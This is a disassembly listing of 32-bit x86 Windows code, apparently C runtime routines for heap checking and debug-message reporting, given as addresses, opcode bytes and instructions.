  409105:	8b 55 08             	mov    0x8(%ebp),%edx
  409108:	89 0a                	mov    %ecx,(%edx)
  40910a:	8b 45 08             	mov    0x8(%ebp),%eax
  40910d:	8b 48 04             	mov    0x4(%eax),%ecx
  409110:	2b 4d 10             	sub    0x10(%ebp),%ecx
  409113:	8b 55 08             	mov    0x8(%ebp),%edx
  409116:	89 4a 04             	mov    %ecx,0x4(%edx)
  409119:	eb 15                	jmp    0x409130
  40911b:	8b 45 08             	mov    0x8(%ebp),%eax
  40911e:	83 c0 08             	add    $0x8,%eax
  409121:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409124:	89 01                	mov    %eax,(%ecx)
  409126:	8b 55 08             	mov    0x8(%ebp),%edx
  409129:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  409130:	8b 45 08             	mov    0x8(%ebp),%eax
  409133:	83 c0 08             	add    $0x8,%eax
  409136:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409139:	2b c8                	sub    %eax,%ecx
  40913b:	c1 e1 04             	shl    $0x4,%ecx
  40913e:	8b 55 08             	mov    0x8(%ebp),%edx
  409141:	8d 84 0a 00 01 00 00 	lea    0x100(%edx,%ecx,1),%eax
  409148:	e9 18 02 00 00       	jmp    0x409365
  40914d:	8b 45 08             	mov    0x8(%ebp),%eax
  409150:	8b 48 04             	mov    0x4(%eax),%ecx
  409153:	8b 55 f8             	mov    -0x8(%ebp),%edx
  409156:	33 c0                	xor    %eax,%eax
  409158:	8a 04 0a             	mov    (%edx,%ecx,1),%al
  40915b:	85 c0                	test   %eax,%eax
  40915d:	74 0c                	je     0x40916b
  40915f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409162:	8b 55 f8             	mov    -0x8(%ebp),%edx
  409165:	03 51 04             	add    0x4(%ecx),%edx
  409168:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40916b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40916e:	03 45 10             	add    0x10(%ebp),%eax
  409171:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  409174:	0f 83 ef 00 00 00    	jae    0x409269
  40917a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40917d:	33 d2                	xor    %edx,%edx
  40917f:	8a 11                	mov    (%ecx),%dl
  409181:	85 d2                	test   %edx,%edx
  409183:	0f 85 cc 00 00 00    	jne    0x409255
  409189:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40918c:	83 c0 01             	add    $0x1,%eax
  40918f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409192:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  409199:	eb 12                	jmp    0x4091ad
  40919b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40919e:	83 c1 01             	add    $0x1,%ecx
  4091a1:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4091a4:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4091a7:	83 c2 01             	add    $0x1,%edx
  4091aa:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4091ad:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4091b0:	33 c9                	xor    %ecx,%ecx
  4091b2:	8a 08                	mov    (%eax),%cl
  4091b4:	85 c9                	test   %ecx,%ecx
  4091b6:	75 02                	jne    0x4091ba
  4091b8:	eb e1                	jmp    0x40919b
  4091ba:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4091bd:	3b 55 10             	cmp    0x10(%ebp),%edx
  4091c0:	73 33                	jae    0x4091f5
  4091c2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4091c5:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  4091c8:	75 0b                	jne    0x4091d5
  4091ca:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4091cd:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4091d0:	89 51 04             	mov    %edx,0x4(%ecx)
  4091d3:	eb 18                	jmp    0x4091ed
  4091d5:	8b 45 0c             	mov    0xc(%ebp),%eax
  4091d8:	2b 45 f0             	sub    -0x10(%ebp),%eax
  4091db:	89 45 0c             	mov    %eax,0xc(%ebp)
  4091de:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4091e1:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  4091e4:	73 07                	jae    0x4091ed
  4091e6:	33 c0                	xor    %eax,%eax
  4091e8:	e9 78 01 00 00       	jmp    0x409365
  4091ed:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4091f0:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4091f3:	eb 5e                	jmp    0x409253
  4091f5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4091f8:	03 45 10             	add    0x10(%ebp),%eax
  4091fb:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4091fe:	73 19                	jae    0x409219
  409200:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409203:	03 4d 10             	add    0x10(%ebp),%ecx
  409206:	8b 55 08             	mov    0x8(%ebp),%edx
  409209:	89 0a                	mov    %ecx,(%edx)
  40920b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40920e:	2b 45 10             	sub    0x10(%ebp),%eax
  409211:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409214:	89 41 04             	mov    %eax,0x4(%ecx)
  409217:	eb 15                	jmp    0x40922e
  409219:	8b 55 08             	mov    0x8(%ebp),%edx
  40921c:	83 c2 08             	add    $0x8,%edx
  40921f:	8b 45 08             	mov    0x8(%ebp),%eax
  409222:	89 10                	mov    %edx,(%eax)
  409224:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409227:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40922e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  409231:	8a 45 10             	mov    0x10(%ebp),%al
  409234:	88 02                	mov    %al,(%edx)
  409236:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409239:	83 c1 08             	add    $0x8,%ecx
  40923c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40923f:	2b d1                	sub    %ecx,%edx
  409241:	c1 e2 04             	shl    $0x4,%edx
  409244:	8b 45 08             	mov    0x8(%ebp),%eax
  409247:	8d 84 10 00 01 00 00 	lea    0x100(%eax,%edx,1),%eax
  40924e:	e9 12 01 00 00       	jmp    0x409365
  409253:	eb 0f                	jmp    0x409264
  409255:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409258:	33 d2                	xor    %edx,%edx
  40925a:	8a 11                	mov    (%ecx),%dl
  40925c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40925f:	03 c2                	add    %edx,%eax
  409261:	89 45 f8             	mov    %eax,-0x8(%ebp)
  409264:	e9 02 ff ff ff       	jmp    0x40916b
  409269:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40926c:	83 c1 08             	add    $0x8,%ecx
  40926f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  409272:	8b 55 f8             	mov    -0x8(%ebp),%edx
  409275:	3b 55 fc             	cmp    -0x4(%ebp),%edx
  409278:	0f 83 e5 00 00 00    	jae    0x409363
  40927e:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409281:	03 45 10             	add    0x10(%ebp),%eax
  409284:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  409287:	0f 83 d6 00 00 00    	jae    0x409363
  40928d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409290:	33 d2                	xor    %edx,%edx
  409292:	8a 11                	mov    (%ecx),%dl
  409294:	85 d2                	test   %edx,%edx
  409296:	0f 85 b3 00 00 00    	jne    0x40934f
  40929c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40929f:	83 c0 01             	add    $0x1,%eax
  4092a2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4092a5:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  4092ac:	eb 12                	jmp    0x4092c0
  4092ae:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4092b1:	83 c1 01             	add    $0x1,%ecx
  4092b4:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4092b7:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4092ba:	83 c2 01             	add    $0x1,%edx
  4092bd:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4092c0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4092c3:	33 c9                	xor    %ecx,%ecx
  4092c5:	8a 08                	mov    (%eax),%cl
  4092c7:	85 c9                	test   %ecx,%ecx
  4092c9:	75 02                	jne    0x4092cd
  4092cb:	eb e1                	jmp    0x4092ae
  4092cd:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4092d0:	3b 55 10             	cmp    0x10(%ebp),%edx
  4092d3:	73 1d                	jae    0x4092f2
  4092d5:	8b 45 0c             	mov    0xc(%ebp),%eax
  4092d8:	2b 45 f0             	sub    -0x10(%ebp),%eax
  4092db:	89 45 0c             	mov    %eax,0xc(%ebp)
  4092de:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4092e1:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  4092e4:	73 04                	jae    0x4092ea
  4092e6:	33 c0                	xor    %eax,%eax
  4092e8:	eb 7b                	jmp    0x409365
  4092ea:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4092ed:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4092f0:	eb 5b                	jmp    0x40934d
  4092f2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4092f5:	03 45 10             	add    0x10(%ebp),%eax
  4092f8:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4092fb:	73 19                	jae    0x409316
  4092fd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409300:	03 4d 10             	add    0x10(%ebp),%ecx
  409303:	8b 55 08             	mov    0x8(%ebp),%edx
  409306:	89 0a                	mov    %ecx,(%edx)
  409308:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40930b:	2b 45 10             	sub    0x10(%ebp),%eax
  40930e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409311:	89 41 04             	mov    %eax,0x4(%ecx)
  409314:	eb 15                	jmp    0x40932b
  409316:	8b 55 08             	mov    0x8(%ebp),%edx
  409319:	83 c2 08             	add    $0x8,%edx
  40931c:	8b 45 08             	mov    0x8(%ebp),%eax
  40931f:	89 10                	mov    %edx,(%eax)
  409321:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409324:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40932b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40932e:	8a 45 10             	mov    0x10(%ebp),%al
  409331:	88 02                	mov    %al,(%edx)
  409333:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409336:	83 c1 08             	add    $0x8,%ecx
  409339:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40933c:	2b d1                	sub    %ecx,%edx
  40933e:	c1 e2 04             	shl    $0x4,%edx
  409341:	8b 45 08             	mov    0x8(%ebp),%eax
  409344:	8d 84 10 00 01 00 00 	lea    0x100(%eax,%edx,1),%eax
  40934b:	eb 18                	jmp    0x409365
  40934d:	eb 0f                	jmp    0x40935e
  40934f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409352:	33 d2                	xor    %edx,%edx
  409354:	8a 11                	mov    (%ecx),%dl
  409356:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409359:	03 c2                	add    %edx,%eax
  40935b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40935e:	e9 0f ff ff ff       	jmp    0x409272
  409363:	33 c0                	xor    %eax,%eax
  409365:	8b e5                	mov    %ebp,%esp
  409367:	5d                   	pop    %ebp
  409368:	c3                   	ret
  409369:	cc                   	int3
  40936a:	cc                   	int3
  40936b:	cc                   	int3
  40936c:	cc                   	int3
  40936d:	cc                   	int3
  40936e:	cc                   	int3
  40936f:	cc                   	int3
  409370:	55                   	push   %ebp
  409371:	8b ec                	mov    %esp,%ebp
  409373:	83 ec 28             	sub    $0x28,%esp
  409376:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40937d:	c7 45 e4 b0 b1 45 00 	movl   $0x45b1b0,-0x1c(%ebp)
  409384:	a1 d0 d1 45 00       	mov    0x45d1d0,%eax
  409389:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  40938c:	75 09                	jne    0x409397
  40938e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409391:	83 c1 01             	add    $0x1,%ecx
  409394:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  409397:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40939a:	8b 42 10             	mov    0x10(%edx),%eax
  40939d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4093a0:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%ebp)
  4093a4:	0f 84 d5 01 00 00    	je     0x40957f
  4093aa:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4093b1:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  4093b8:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4093bb:	8b 51 10             	mov    0x10(%ecx),%edx
  4093be:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4093c1:	eb 15                	jmp    0x4093d8
  4093c3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4093c6:	83 c0 01             	add    $0x1,%eax
  4093c9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4093cc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4093cf:	81 c1 00 10 00 00    	add    $0x1000,%ecx
  4093d5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4093d8:	81 7d f4 00 04 00 00 	cmpl   $0x400,-0xc(%ebp)
  4093df:	0f 8d 9a 01 00 00    	jge    0x40957f
  4093e5:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4093e8:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4093eb:	83 7c d0 18 ff       	cmpl   $0xffffffff,0x18(%eax,%edx,8)
  4093f0:	75 2e                	jne    0x409420
  4093f2:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  4093f6:	75 1a                	jne    0x409412
  4093f8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4093fb:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4093fe:	8d 44 ca 18          	lea    0x18(%edx,%ecx,8),%eax
  409402:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  409405:	39 41 0c             	cmp    %eax,0xc(%ecx)
  409408:	74 08                	je     0x409412
  40940a:	83 c8 ff             	or     $0xffffffff,%eax
  40940d:	e9 91 01 00 00       	jmp    0x4095a3
  409412:	8b 55 d8             	mov    -0x28(%ebp),%edx
  409415:	83 c2 01             	add    $0x1,%edx
  409418:	89 55 d8             	mov    %edx,-0x28(%ebp)
  40941b:	e9 5a 01 00 00       	jmp    0x40957a
  409420:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409423:	05 f8 00 00 00       	add    $0xf8,%eax
  409428:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40942b:	39 01                	cmp    %eax,(%ecx)
  40942d:	72 0a                	jb     0x409439
  40942f:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  409434:	e9 6a 01 00 00       	jmp    0x4095a3
  409439:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40943c:	33 c0                	xor    %eax,%eax
  40943e:	8a 82 f8 00 00 00    	mov    0xf8(%edx),%al
  409444:	3d ff 00 00 00       	cmp    $0xff,%eax
  409449:	74 0a                	je     0x409455
  40944b:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
  409450:	e9 4e 01 00 00       	jmp    0x4095a3
  409455:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40945c:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  409463:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40946a:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  409471:	81 7d f0 f0 00 00 00 	cmpl   $0xf0,-0x10(%ebp)
  409478:	0f 8d d9 00 00 00    	jge    0x409557
  40947e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409481:	8b 55 fc             	mov    -0x4(%ebp),%edx
  409484:	8d 44 0a 08          	lea    0x8(%edx,%ecx,1),%eax
  409488:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40948b:	3b 01                	cmp    (%ecx),%eax
  40948d:	75 09                	jne    0x409498
  40948f:	8b 55 e8             	mov    -0x18(%ebp),%edx
  409492:	83 c2 01             	add    $0x1,%edx
  409495:	89 55 e8             	mov    %edx,-0x18(%ebp)
  409498:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40949b:	03 45 f0             	add    -0x10(%ebp),%eax
  40949e:	33 c9                	xor    %ecx,%ecx
  4094a0:	8a 48 08             	mov    0x8(%eax),%cl
  4094a3:	85 c9                	test   %ecx,%ecx
  4094a5:	75 20                	jne    0x4094c7
  4094a7:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4094aa:	83 c2 01             	add    $0x1,%edx
  4094ad:	89 55 dc             	mov    %edx,-0x24(%ebp)
  4094b0:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4094b3:	83 c0 01             	add    $0x1,%eax
  4094b6:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4094b9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4094bc:	83 c1 01             	add    $0x1,%ecx
  4094bf:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4094c2:	e9 8b 00 00 00       	jmp    0x409552
  4094c7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4094ca:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4094cd:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4094d0:	3b 4c d0 1c          	cmp    0x1c(%eax,%edx,8),%ecx
  4094d4:	7c 0a                	jl     0x4094e0
  4094d6:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  4094db:	e9 c3 00 00 00       	jmp    0x4095a3
  4094e0:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  4094e4:	75 1e                	jne    0x409504
  4094e6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4094e9:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4094ec:	3b 42 04             	cmp    0x4(%edx),%eax
  4094ef:	7d 0a                	jge    0x4094fb
  4094f1:	b8 fb ff ff ff       	mov    $0xfffffffb,%eax
  4094f6:	e9 a8 00 00 00       	jmp    0x4095a3
  4094fb:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4094fe:	83 c1 01             	add    $0x1,%ecx
  409501:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  409504:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  40950b:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40950e:	83 c2 01             	add    $0x1,%edx
  409511:	89 55 ec             	mov    %edx,-0x14(%ebp)
  409514:	eb 09                	jmp    0x40951f
  409516:	8b 45 ec             	mov    -0x14(%ebp),%eax
  409519:	83 c0 01             	add    $0x1,%eax
  40951c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40951f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409522:	03 4d f0             	add    -0x10(%ebp),%ecx
  409525:	33 d2                	xor    %edx,%edx
  409527:	8a 51 08             	mov    0x8(%ecx),%dl
  40952a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40952d:	03 c2                	add    %edx,%eax
  40952f:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  409532:	7d 18                	jge    0x40954c
  409534:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409537:	03 4d ec             	add    -0x14(%ebp),%ecx
  40953a:	33 d2                	xor    %edx,%edx
  40953c:	8a 51 08             	mov    0x8(%ecx),%dl
  40953f:	85 d2                	test   %edx,%edx
  409541:	74 07                	je     0x40954a
  409543:	b8 fa ff ff ff       	mov    $0xfffffffa,%eax
  409548:	eb 59                	jmp    0x4095a3
  40954a:	eb ca                	jmp    0x409516
  40954c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40954f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409552:	e9 1a ff ff ff       	jmp    0x409471
  409557:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40955a:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40955d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  409560:	3b 44 ca 18          	cmp    0x18(%edx,%ecx,8),%eax
  409564:	74 07                	je     0x40956d
  409566:	b8 f9 ff ff ff       	mov    $0xfffffff9,%eax
  40956b:	eb 36                	jmp    0x4095a3
  40956d:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  409571:	75 07                	jne    0x40957a
  409573:	b8 f8 ff ff ff       	mov    $0xfffffff8,%eax
  409578:	eb 29                	jmp    0x4095a3
  40957a:	e9 44 fe ff ff       	jmp    0x4093c3
  40957f:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  409582:	8b 11                	mov    (%ecx),%edx
  409584:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  409587:	81 7d e4 b0 b1 45 00 	cmpl   $0x45b1b0,-0x1c(%ebp)
  40958e:	0f 85 f0 fd ff ff    	jne    0x409384
  409594:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  409598:	75 07                	jne    0x4095a1
  40959a:	b8 f7 ff ff ff       	mov    $0xfffffff7,%eax
  40959f:	eb 02                	jmp    0x4095a3
  4095a1:	33 c0                	xor    %eax,%eax
  4095a3:	8b e5                	mov    %ebp,%esp
  4095a5:	5d                   	pop    %ebp
  4095a6:	c3                   	ret
  4095a7:	cc                   	int3
  4095a8:	cc                   	int3
  4095a9:	cc                   	int3
  4095aa:	cc                   	int3
  4095ab:	cc                   	int3
  4095ac:	cc                   	int3
  4095ad:	cc                   	int3
  4095ae:	cc                   	int3
  4095af:	cc                   	int3
  4095b0:	55                   	push   %ebp
  4095b1:	8b ec                	mov    %esp,%ebp
  4095b3:	ff 15 b8 f0 40 00    	call   *0x40f0b8
  4095b9:	5d                   	pop    %ebp
  4095ba:	c3                   	ret
  4095bb:	cc                   	int3
  4095bc:	cc                   	int3
  4095bd:	cc                   	int3
  4095be:	cc                   	int3
  4095bf:	cc                   	int3
  4095c0:	55                   	push   %ebp
  4095c1:	8b ec                	mov    %esp,%ebp
  4095c3:	b8 2c 30 00 00       	mov    $0x302c,%eax
  4095c8:	e8 63 19 00 00       	call   0x40af30
  4095cd:	57                   	push   %edi
  4095ce:	c6 85 f8 cf ff ff 00 	movb   $0x0,-0x3008(%ebp)
  4095d5:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4095da:	33 c0                	xor    %eax,%eax
  4095dc:	8d bd f9 cf ff ff    	lea    -0x3007(%ebp),%edi
  4095e2:	f3 ab                	rep stos %eax,%es:(%edi)
  4095e4:	66 ab                	stos   %ax,%es:(%edi)
  4095e6:	aa                   	stos   %al,%es:(%edi)
  4095e7:	c6 85 f8 df ff ff 00 	movb   $0x0,-0x2008(%ebp)
  4095ee:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4095f3:	33 c0                	xor    %eax,%eax
  4095f5:	8d bd f9 df ff ff    	lea    -0x2007(%ebp),%edi
  4095fb:	f3 ab                	rep stos %eax,%es:(%edi)
  4095fd:	66 ab                	stos   %ax,%es:(%edi)
  4095ff:	aa                   	stos   %al,%es:(%edi)
  409600:	c6 85 00 f0 ff ff 00 	movb   $0x0,-0x1000(%ebp)
  409607:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40960c:	33 c0                	xor    %eax,%eax
  40960e:	8d bd 01 f0 ff ff    	lea    -0xfff(%ebp),%edi
  409614:	f3 ab                	rep stos %eax,%es:(%edi)
  409616:	66 ab                	stos   %ax,%es:(%edi)
  409618:	aa                   	stos   %al,%es:(%edi)
  409619:	8d 45 1c             	lea    0x1c(%ebp),%eax
  40961c:	89 85 fc ef ff ff    	mov    %eax,-0x1004(%ebp)
  409622:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  409626:	7c 06                	jl     0x40962e
  409628:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  40962c:	7c 08                	jl     0x409636
  40962e:	83 c8 ff             	or     $0xffffffff,%eax
  409631:	e9 15 03 00 00       	jmp    0x40994b
  409636:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40963a:	0f 85 a0 00 00 00    	jne    0x4096e0
  409640:	68 d8 d1 45 00       	push   $0x45d1d8
  409645:	ff 15 c4 f0 40 00    	call   *0x40f0c4
  40964b:	85 c0                	test   %eax,%eax
  40964d:	0f 8e 8d 00 00 00    	jle    0x4096e0
  409653:	83 3d 48 de 45 00 00 	cmpl   $0x0,0x45de48
  40965a:	75 42                	jne    0x40969e
  40965c:	68 60 fb 40 00       	push   $0x40fb60
  409661:	ff 15 04 f0 40 00    	call   *0x40f004
  409667:	89 85 f4 cf ff ff    	mov    %eax,-0x300c(%ebp)
  40966d:	83 bd f4 cf ff ff 00 	cmpl   $0x0,-0x300c(%ebp)
  409674:	74 20                	je     0x409696
  409676:	68 54 fb 40 00       	push   $0x40fb54
  40967b:	8b 8d f4 cf ff ff    	mov    -0x300c(%ebp),%ecx
  409681:	51                   	push   %ecx
  409682:	ff 15 00 f0 40 00    	call   *0x40f000
  409688:	a3 48 de 45 00       	mov    %eax,0x45de48
  40968d:	83 3d 48 de 45 00 00 	cmpl   $0x0,0x45de48
  409694:	75 08                	jne    0x40969e
  409696:	83 c8 ff             	or     $0xffffffff,%eax
  409699:	e9 ad 02 00 00       	jmp    0x40994b
  40969e:	8b 55 10             	mov    0x10(%ebp),%edx
  4096a1:	52                   	push   %edx
  4096a2:	8b 45 0c             	mov    0xc(%ebp),%eax
  4096a5:	50                   	push   %eax
  4096a6:	68 20 fb 40 00       	push   $0x40fb20
  4096ab:	8d 8d f8 df ff ff    	lea    -0x2008(%ebp),%ecx
  4096b1:	51                   	push   %ecx
  4096b2:	ff 15 48 de 45 00    	call   *0x45de48
  4096b8:	83 c4 10             	add    $0x10,%esp
  4096bb:	8d 95 f8 df ff ff    	lea    -0x2008(%ebp),%edx
  4096c1:	52                   	push   %edx
  4096c2:	ff 15 c0 f0 40 00    	call   *0x40f0c0
  4096c8:	68 d8 d1 45 00       	push   $0x45d1d8
  4096cd:	ff 15 bc f0 40 00    	call   *0x40f0bc
  4096d3:	e8 d8 fe ff ff       	call   0x4095b0
  4096d8:	83 c8 ff             	or     $0xffffffff,%eax
  4096db:	e9 6b 02 00 00       	jmp    0x40994b
  4096e0:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  4096e4:	74 37                	je     0x40971d
  4096e6:	8b 85 fc ef ff ff    	mov    -0x1004(%ebp),%eax
  4096ec:	50                   	push   %eax
  4096ed:	8b 4d 18             	mov    0x18(%ebp),%ecx
  4096f0:	51                   	push   %ecx
  4096f1:	68 ed 0f 00 00       	push   $0xfed
  4096f6:	8d 95 00 f0 ff ff    	lea    -0x1000(%ebp),%edx
  4096fc:	52                   	push   %edx
  4096fd:	e8 9e 20 00 00       	call   0x40b7a0
  409702:	83 c4 10             	add    $0x10,%esp
  409705:	85 c0                	test   %eax,%eax
  409707:	7d 14                	jge    0x40971d
  409709:	68 f4 fa 40 00       	push   $0x40faf4
  40970e:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  409714:	50                   	push   %eax
  409715:	e8 b6 11 00 00       	call   0x40a8d0
  40971a:	83 c4 08             	add    $0x8,%esp
  40971d:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  409721:	75 32                	jne    0x409755
  409723:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  409727:	74 0c                	je     0x409735
  409729:	c7 85 d8 cf ff ff e0 	movl   $0x40fae0,-0x3028(%ebp)
  409730:	fa 40 00 
  409733:	eb 0a                	jmp    0x40973f
  409735:	c7 85 d8 cf ff ff cc 	movl   $0x40facc,-0x3028(%ebp)
  40973c:	fa 40 00 
  40973f:	8b 8d d8 cf ff ff    	mov    -0x3028(%ebp),%ecx
  409745:	51                   	push   %ecx
  409746:	8d 95 f8 cf ff ff    	lea    -0x3008(%ebp),%edx
  40974c:	52                   	push   %edx
  40974d:	e8 7e 11 00 00       	call   0x40a8d0
  409752:	83 c4 08             	add    $0x8,%esp
  409755:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  40975b:	50                   	push   %eax
  40975c:	8d 8d f8 cf ff ff    	lea    -0x3008(%ebp),%ecx
  409762:	51                   	push   %ecx
  409763:	e8 78 11 00 00       	call   0x40a8e0
  409768:	83 c4 08             	add    $0x8,%esp
  40976b:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40976f:	75 39                	jne    0x4097aa
  409771:	8b 55 08             	mov    0x8(%ebp),%edx
  409774:	8b 04 95 dc d1 45 00 	mov    0x45d1dc(,%edx,4),%eax
  40977b:	83 e0 01             	and    $0x1,%eax
  40977e:	85 c0                	test   %eax,%eax
  409780:	74 14                	je     0x409796
  409782:	68 c8 fa 40 00       	push   $0x40fac8
  409787:	8d 8d f8 cf ff ff    	lea    -0x3008(%ebp),%ecx
  40978d:	51                   	push   %ecx
  40978e:	e8 4d 11 00 00       	call   0x40a8e0
  409793:	83 c4 08             	add    $0x8,%esp
  409796:	68 c4 fa 40 00       	push   $0x40fac4
  40979b:	8d 95 f8 cf ff ff    	lea    -0x3008(%ebp),%edx
  4097a1:	52                   	push   %edx
  4097a2:	e8 39 11 00 00       	call   0x40a8e0
  4097a7:	83 c4 08             	add    $0x8,%esp
